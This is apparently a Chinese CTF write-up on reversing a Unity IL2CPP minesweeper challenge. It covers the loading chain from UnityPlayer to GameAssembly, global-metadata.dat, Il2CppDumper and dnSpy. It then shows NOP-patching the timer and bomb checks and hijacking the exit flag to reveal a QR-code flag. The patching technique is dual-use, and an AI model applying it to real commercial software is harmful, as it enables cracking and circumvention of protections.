<p>由于开始时对unity的一些文件配置完全不懂，导致我看的晕头转向。不过看了别人逆向的一些实例，我大概理解了文件结构。那我写长一点，从启动函数开始。</p>
<p>众所周知为了玩游戏，点开了游戏，但是游戏 .exe 里面其实并没有游戏的逻辑<br><img src="https://cdn.jsdelivr.net/gh/wr-web/picture/unityMain.jpg" alt="unityMain"></p>
<p>直接跳转到了 UnityMain 函数中，而这个函数在别的 dll 中，我们可以打开 PE-bear 其实也可以自己对着节区去看，不过算起来比较复杂，有现成的工具用一下也挺好</p>
<p><img src="https://cdn.jsdelivr.net/gh/wr-web/picture/UnityMain_2.jpg" alt="UnityMain_2"></p>
<p>然后我们就开始对 UnityPlayer 释放魔法（动态调试），发现 UnityPlayer 其实是通过 CreatWindowExW 创建句柄，传递给 showWindow，最终打开 unity 窗口。其中 sub0x180547E70 可以称为 Load_Game_function （我自己这么定义的 233 ）</p>
<p>其中 sub_180088310 函数常用于检测或者加载是否加载成功一些文件，比如 app.info , config , Play.log 等文件，但是我们仍然找不到游戏逻辑，继续追踪发现在</p>
<p><img src="https://cdn.jsdelivr.net/gh/wr-web/picture/gameAssembly.jpg" alt="gameAssembly"></p>
<p>此处加载了 GameAssembly.dll 加载成功后会 继续加载一些文件比如 $(game)&#x2F;game_data&#x2F;il2cpp_data&#x2F;etc , 再后来也会加载一些 creen 相关的模块 ，不顾哦这个我也不懂 ，过了一段函数，会加载一堆 dll ，最后就是打开窗口 showWindow . 再进一步就可以调试 GameAssembly.dll 结合网上所说，GameAssembly.dll 中包含着游戏的逻辑，我对他就更加期待了起来。</p>
<p>打开会发现很多名为 il2cpp_XXX_XXX_XXX 的函数，查阅一些别人的博客，再加自己的动态调试，加看 IL 源码 ，我也稍微理解了一些il2cpp_xxx 函数的作用 ，因为是从 C# -&gt; CPP -&gt; PE 他面向对象的方法，思想也就变成了 il2cpp_xxx 的一些函数，而在 il2cpp 源码中比如这一段</p>
<pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">// System.Boolean AFiveSecondChallenge.BombChecker::CheckIfExpired()</span>
IL2CPP_EXTERN_C IL2CPP_METHOD_ATTR <span class="token keyword">bool</span> <span class="token function">BombChecker_CheckIfExpired_m11965D79AB8C709FB9F999ACFFA108438A43652E</span> <span class="token punctuation">(</span><span class="token keyword">const</span> RuntimeMethod<span class="token operator">*</span> method<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
	<span class="token keyword">static</span> <span class="token keyword">bool</span> s_Il2CppMethodInitialized<span class="token punctuation">;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>s_Il2CppMethodInitialized<span class="token punctuation">)</span>
	<span class="token punctuation">&#123;</span>
		<span class="token function">il2cpp_codegen_initialize_method</span> <span class="token punctuation">(</span>BombChecker_CheckIfExpired_m11965D79AB8C709FB9F999ACFFA108438A43652E_MetadataUsageId<span class="token punctuation">)</span><span class="token punctuation">;</span>
		s_Il2CppMethodInitialized <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>
	<span class="token punctuation">&#123;</span>
		<span class="token function">IL2CPP_RUNTIME_CLASS_INIT</span><span class="token punctuation">(</span>BombChecker_t6F78547653A30303197DE752136BFF107B035342_il2cpp_TypeInfo_var<span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">int64_t</span> L_0 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>BombChecker_t6F78547653A30303197DE752136BFF107B035342_StaticFields<span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">il2cpp_codegen_static_fields_for</span><span class="token punctuation">(</span>BombChecker_t6F78547653A30303197DE752136BFF107B035342_il2cpp_TypeInfo_var<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">get_firstQueryTime_4</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>L_0<span class="token punctuation">)</span>
		<span class="token punctuation">&#123;</span>
			<span class="token keyword">goto</span> IL_001b<span class="token punctuation">;</span>
		<span class="token punctuation">&#125;</span>
	<span class="token punctuation">&#125;</span>
	<span class="token punctuation">&#123;</span>
		<span class="token function">IL2CPP_RUNTIME_CLASS_INIT</span><span class="token punctuation">(</span>BombChecker_t6F78547653A30303197DE752136BFF107B035342_il2cpp_TypeInfo_var<span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">int64_t</span> L_1 <span class="token operator">=</span> <span class="token function">BombChecker_GetNowUnixTime_m02658B00EEC2CD986B3894FB392B39BB186716A8</span><span class="token punctuation">(</span><span class="token comment">/*hidden argument*/</span><span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">int64_t</span> L_2 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>BombChecker_t6F78547653A30303197DE752136BFF107B035342_StaticFields<span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">il2cpp_codegen_static_fields_for</span><span class="token punctuation">(</span>BombChecker_t6F78547653A30303197DE752136BFF107B035342_il2cpp_TypeInfo_var<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">get_firstQueryTime_4</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">int32_t</span> L_3 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>BombChecker_t6F78547653A30303197DE752136BFF107B035342_StaticFields<span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">il2cpp_codegen_static_fields_for</span><span class="token punctuation">(</span>BombChecker_t6F78547653A30303197DE752136BFF107B035342_il2cpp_TypeInfo_var<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">get_expireIn_5</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token keyword">bool</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int64_t</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int64_t</span><span class="token punctuation">)</span><span class="token function">il2cpp_codegen_subtract</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int64_t</span><span class="token punctuation">)</span>L_1<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">int64_t</span><span class="token punctuation">)</span>L_2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int64_t</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int64_t</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int64_t</span><span class="token punctuation">)</span>L_3<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">?</span> <span class="token number">1</span> <span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>
    
IL_001b<span class="token operator">:</span>
	<span class="token punctuation">&#123;</span>
		<span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token keyword">bool</span><span class="token punctuation">)</span><span class="token number">0</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<p>每次调用一些函数之前一般会使用 il2cpp_runtime_class_init （猜测是创建对象），然后使用 il2cpp_substract_xxx 等函数实现对对象的操作，非常奇妙的感觉，由此可以看出 <strong>只要我们在 il2cpp_runtime_class_init 下断点，我们就能知道 CheckIfExpired，通过交叉引用能找到</strong>。</p>
<p>上面所说不失为一种方法，但是事实是，即使是调试到 只有点击地雷才会 碰到断点的时候，通过条件断点，日志，我们能发现 调用了 15次 il2cpp_runtime_class_init 而从一开始运行的话调用了将近 50 次 所以通过这个方法 我们往往会偏离目标，而且找到函数之后 我们还要根据函数的逻辑去比对 il2cpp 源码 实在是离谱。由此 我们引入老大哥。 <em><strong>global-metadata.dat</strong></em></p>
<p>这个文件记载了一些被调用的字符串，还有函数名以及 偏移，这个文件有一个结构体，其实可以mark一下</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">Il2CppGlobalMetadataHeader</span>
<span class="token punctuation">&#123;</span>
    <span class="token class-name">int32_t</span> sanity<span class="token punctuation">;</span>
    <span class="token class-name">int32_t</span> version<span class="token punctuation">;</span>
    <span class="token class-name">int32_t</span> stringLiteralOffset<span class="token punctuation">;</span> <span class="token comment">// string data for managed code</span>
    <span class="token class-name">int32_t</span> stringLiteralCount<span class="token punctuation">;</span>
    <span class="token class-name">int32_t</span> stringLiteralDataOffset<span class="token punctuation">;</span>
    <span class="token class-name">int32_t</span> stringLiteralDataCount<span class="token punctuation">;</span>
    <span class="token class-name">int32_t</span> stringOffset<span class="token punctuation">;</span> <span class="token comment">// string data for metadata</span>
    <span class="token class-name">int32_t</span> stringCount<span class="token punctuation">;</span>
    <span class="token class-name">int32_t</span> eventsOffset<span class="token punctuation">;</span> <span class="token comment">// Il2CppEventDefinition</span>
    <span class="token class-name">int32_t</span> eventsCount<span class="token punctuation">;</span>
    <span class="token class-name">int32_t</span> propertiesOffset<span class="token punctuation">;</span> <span class="token comment">// Il2CppPropertyDefinition</span>
    <span class="token class-name">int32_t</span> propertiesCount<span class="token punctuation">;</span>
    <span class="token class-name">int32_t</span> methodsOffset<span class="token punctuation">;</span> <span class="token comment">// Il2CppMethodDefinition</span>
    <span class="token class-name">int32_t</span> methodsCount<span class="token punctuation">;</span>
    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<p>然后通过调试得知，估计这个 Metadata 文件是在 UnityPlayer.dll 中载入的，反之我们也能从中读取到一些东西，甚至网上已经有了可以 dump Metadata 的工具 Il2cppDumper<br>hint 2: il2cpp 中间文件（源码）已经直接给了，就不太需要用 il2cppdumper 这类工具去死怼 GameAssembly.dll 了 囧</p>
<p>其实我不知道魔法少女为什么会给这个hint，估计是担心我们白怼 GameAssembly.dll ，其实正常的思路应该是去解密那个地雷矩阵，不过我一脑子扎进去就没停下来，最后造成这个结局 233。（其实 IL2CPP 读起来有点反人类，括号太多了，看着就烦…）其实这里有一个小 Tip 待会儿再讲</p>
<p>通过 Il2cppDumper 我们可以得到源码的 dll , 不过并没有具体的内容，大多只是有 偏移地址之类的 ，不过这样也足够了</p>
<p><img src="https://cdn.jsdelivr.net/gh/wr-web/picture/dump.jpg" alt="dump"></p>
<p>再通过 dnspy 打开 这个dll</p>
<p><img src="https://cdn.jsdelivr.net/gh/wr-web/picture/new.jpg" alt="new"></p>
<p><img src="https://cdn.jsdelivr.net/gh/wr-web/picture/old.jpg" alt="old"></p>
<p>两个对比很明显 我们得到了函数地址 ，最后就开始了魔改环节 。</p>
<p>这个环节试错比较多，我也慢慢讲</p>
<p>在 CS_Mouse_Brick 函数中我们会发现 是否发现炸弹的两条分路</p>
<p><img src="https://cdn.jsdelivr.net/gh/wr-web/picture/first.jpg" alt="first"></p>
<p>而在此之前我们会先检测一遍时间，我当场就把他的对我不好的逻辑 给 nop 掉了</p>
<p><img src="https://cdn.jsdelivr.net/gh/wr-web/picture/firstNop.jpg" alt="firstNop"></p>
<p>只改了这一处 会发现 时间过了之后，不管点什么 他都是炸弹！ 动调了一下 发现了原因</p>
<p><img src="https://cdn.jsdelivr.net/gh/wr-web/picture/second_change.jpg" alt="second_change"></p>
<p>这一段在 CheckBombAt 函数中 ，检测到超时之后，这里本来会指向别的地方，最终造成 点啥都是炸弹，我就把这里两个逻辑都汇聚在一起，这样这俩就都是魔法少女了。</p>
<p>最后我们还需修改一处，就是当程序发现你点了雷，他就会终止你接下来的行为。</p>
<p>而这个逻辑是在<br><img src="https://cdn.jsdelivr.net/gh/wr-web/picture/final_change.jpg" alt="final_change"></p>
<p>如果要退出他会置 1 那我反过来不让他退出，所以我就置 0；最后就成功地劫持了程序流</p>
<p>话说我刚才说了 （劫持） 。。。我这明明是 （抢劫）</p>
<p>pwn里面改不了程序流，大多通过溢出来劫持，因此称我这个为 （抢劫） 一点不过分。</p>
<p>然后就是手酸的点地雷了 233 ，再是手酸的绘制 二维码了</p>
<p>最后结果</p>
<p><img src="https://cdn.jsdelivr.net/gh/wr-web/picture/YouLoser0.png" alt="YouLoser"></p>
<p>其实只要缩小一下就能扫出来，还好二维码可以有误差，不然我只好裂开。</p>
<p>手~~~好酸啊，我下次一定去看矩阵。。。</p>
<p>好了，最后我再收回我说的 Tip 我们看回 il2cpp 的源码</p>
<pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token punctuation">&#123;</span>
	<span class="token function">IL2CPP_RUNTIME_CLASS_INIT</span><span class="token punctuation">(</span>BombChecker_t6F78547653A30303197DE752136BFF107B035342_il2cpp_TypeInfo_var<span class="token punctuation">)</span><span class="token punctuation">;</span>
	DoubleU5BU2CU2CU5D_t52D90E91F26D35646AF02F1D1DF3770A40CD9B7D<span class="token operator">*</span> L_3 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>BombChecker_t6F78547653A30303197DE752136BFF107B035342_StaticFields<span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">il2cpp_codegen_static_fields_for</span><span class="token punctuation">(</span>BombChecker_t6F78547653A30303197DE752136BFF107B035342_il2cpp_TypeInfo_var<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">get_matrix_6</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	Vector2_tA85D2DD88578276CA8A8796756458277E72D073D  L_4 <span class="token operator">=</span> ___vec0<span class="token punctuation">;</span>
	<span class="token keyword">float</span> L_5 <span class="token operator">=</span> L_4<span class="token punctuation">.</span><span class="token function">get_y_1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	Vector2_tA85D2DD88578276CA8A8796756458277E72D073D  L_6 <span class="token operator">=</span> ___vec0<span class="token punctuation">;</span>
	<span class="token keyword">float</span> L_7 <span class="token operator">=</span> L_6<span class="token punctuation">.</span><span class="token function">get_x_0</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">NullCheck</span><span class="token punctuation">(</span><span class="token punctuation">(</span>DoubleU5BU2CU2CU5D_t52D90E91F26D35646AF02F1D1DF3770A40CD9B7D<span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>DoubleU5BU2CU2CU5D_t52D90E91F26D35646AF02F1D1DF3770A40CD9B7D<span class="token operator">*</span><span class="token punctuation">)</span>L_3<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">double</span> L_8 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>DoubleU5BU2CU2CU5D_t52D90E91F26D35646AF02F1D1DF3770A40CD9B7D<span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>DoubleU5BU2CU2CU5D_t52D90E91F26D35646AF02F1D1DF3770A40CD9B7D<span class="token operator">*</span><span class="token punctuation">)</span>L_3<span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">GetAt</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int32_t</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int32_t</span><span class="token punctuation">)</span>L_5<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int32_t</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int32_t</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int32_t</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int32_t</span><span class="token punctuation">)</span>L_7<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token punctuation">(</span><span class="token keyword">int32_t</span><span class="token punctuation">)</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	DoubleU5BU2CU2CU5D_t52D90E91F26D35646AF02F1D1DF3770A40CD9B7D<span class="token operator">*</span> L_9 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>BombChecker_t6F78547653A30303197DE752136BFF107B035342_StaticFields<span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">il2cpp_codegen_static_fields_for</span><span class="token punctuation">(</span>BombChecker_t6F78547653A30303197DE752136BFF107B035342_il2cpp_TypeInfo_var<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">get_matrix_6</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	Vector2_tA85D2DD88578276CA8A8796756458277E72D073D  L_10 <span class="token operator">=</span> ___vec0<span class="token punctuation">;</span>
	<span class="token keyword">float</span> L_11 <span class="token operator">=</span> L_10<span class="token punctuation">.</span><span class="token function">get_y_1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	Vector2_tA85D2DD88578276CA8A8796756458277E72D073D  L_12 <span class="token operator">=</span> ___vec0<span class="token punctuation">;</span>
	<span class="token keyword">float</span> L_13 <span class="token operator">=</span> L_12<span class="token punctuation">.</span><span class="token function">get_x_0</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">NullCheck</span><span class="token punctuation">(</span><span class="token punctuation">(</span>DoubleU5BU2CU2CU5D_t52D90E91F26D35646AF02F1D1DF3770A40CD9B7D<span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>DoubleU5BU2CU2CU5D_t52D90E91F26D35646AF02F1D1DF3770A40CD9B7D<span class="token operator">*</span><span class="token punctuation">)</span>L_9<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">double</span> L_14 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>DoubleU5BU2CU2CU5D_t52D90E91F26D35646AF02F1D1DF3770A40CD9B7D<span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>DoubleU5BU2CU2CU5D_t52D90E91F26D35646AF02F1D1DF3770A40CD9B7D<span class="token operator">*</span><span class="token punctuation">)</span>L_9<span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">GetAt</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int32_t</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int32_t</span><span class="token punctuation">)</span>L_11<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int32_t</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int32_t</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int32_t</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int32_t</span><span class="token punctuation">)</span>L_13<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token punctuation">(</span><span class="token keyword">int32_t</span><span class="token punctuation">)</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	V_0 <span class="token operator">=</span> L_14<span class="token punctuation">;</span>
	DoubleU5BU2CU2CU5D_t52D90E91F26D35646AF02F1D1DF3770A40CD9B7D<span class="token operator">*</span> L_15 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>BombChecker_t6F78547653A30303197DE752136BFF107B035342_StaticFields<span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">il2cpp_codegen_static_fields_for</span><span class="token punctuation">(</span>BombChecker_t6F78547653A30303197DE752136BFF107B035342_il2cpp_TypeInfo_var<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">get_matrix_6</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	Vector2_tA85D2DD88578276CA8A8796756458277E72D073D  L_16 <span class="token operator">=</span> ___vec0<span class="token punctuation">;</span>
	<span class="token keyword">float</span> L_17 <span class="token operator">=</span> L_16<span class="token punctuation">.</span><span class="token function">get_y_1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	Vector2_tA85D2DD88578276CA8A8796756458277E72D073D  L_18 <span class="token operator">=</span> ___vec0<span class="token punctuation">;</span>
	<span class="token keyword">float</span> L_19 <span class="token operator">=</span> L_18<span class="token punctuation">.</span><span class="token function">get_x_0</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">NullCheck</span><span class="token punctuation">(</span><span class="token punctuation">(</span>DoubleU5BU2CU2CU5D_t52D90E91F26D35646AF02F1D1DF3770A40CD9B7D<span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>DoubleU5BU2CU2CU5D_t52D90E91F26D35646AF02F1D1DF3770A40CD9B7D<span class="token operator">*</span><span class="token punctuation">)</span>L_15<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">double</span> L_20 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>DoubleU5BU2CU2CU5D_t52D90E91F26D35646AF02F1D1DF3770A40CD9B7D<span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>DoubleU5BU2CU2CU5D_t52D90E91F26D35646AF02F1D1DF3770A40CD9B7D<span class="token operator">*</span><span class="token punctuation">)</span>L_15<span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">GetAt</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int32_t</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int32_t</span><span class="token punctuation">)</span>L_17<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int32_t</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int32_t</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int32_t</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int32_t</span><span class="token punctuation">)</span>L_19<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token punctuation">(</span><span class="token keyword">int32_t</span><span class="token punctuation">)</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	V_1 <span class="token operator">=</span> L_20<span class="token punctuation">;</span>
	Vector2_tA85D2DD88578276CA8A8796756458277E72D073D  L_21 <span class="token operator">=</span> ___vec0<span class="token punctuation">;</span>
	<span class="token keyword">float</span> L_22 <span class="token operator">=</span> L_21<span class="token punctuation">.</span><span class="token function">get_x_0</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	V_2 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">double</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">double</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">float</span><span class="token punctuation">)</span><span class="token function">il2cpp_codegen_subtract</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">float</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token function">fmodf</span><span class="token punctuation">(</span>L_22<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">3.0f</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">float</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">1.0f</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">double</span> L_23 <span class="token operator">=</span> V_2<span class="token punctuation">;</span>
	<span class="token keyword">double</span> L_24 <span class="token operator">=</span> V_2<span class="token punctuation">;</span>
	<span class="token keyword">double</span> L_25 <span class="token operator">=</span> V_0<span class="token punctuation">;</span>
	<span class="token keyword">double</span> L_26 <span class="token operator">=</span> V_2<span class="token punctuation">;</span>
	<span class="token keyword">double</span> L_27 <span class="token operator">=</span> V_1<span class="token punctuation">;</span>
       <span class="token comment">//此注释没什么用，请忽略</span>
	<span class="token comment">//		L_8*L_23*L_24+L_25*L_26+L_27</span>
	<span class="token comment">// L_8  = GetAt(y1,x0/3,0)</span>
	<span class="token comment">// L_23 = x0 fmodf 3 -1</span>
	<span class="token comment">// L_24 = x0 fmodf 3 -1</span>
	<span class="token comment">// L_25 = GetAt(y1,x0/3,1)</span>
	<span class="token comment">// L_26 = x0 fmodf 3 -1</span>
	<span class="token comment">// L_27 = GetAt(y1,x0/3,1)</span>
	<span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token keyword">bool</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">double</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">double</span><span class="token punctuation">)</span><span class="token function">il2cpp_codegen_add</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">double</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">double</span><span class="token punctuation">)</span><span class="token function">il2cpp_codegen_add</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">double</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">double</span><span class="token punctuation">)</span><span class="token function">il2cpp_codegen_multiply</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">double</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">double</span><span class="token punctuation">)</span><span class="token function">il2cpp_codegen_multiply</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">double</span><span class="token punctuation">)</span>L_8<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">double</span><span class="token punctuation">)</span>L_23<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">double</span><span class="token punctuation">)</span>L_24<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">double</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">double</span><span class="token punctuation">)</span><span class="token function">il2cpp_codegen_multiply</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">double</span><span class="token punctuation">)</span>L_25<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">double</span><span class="token punctuation">)</span>L_26<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">double</span><span class="token punctuation">)</span>L_27<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">double</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">0.0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">?</span> <span class="token number">1</span> <span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
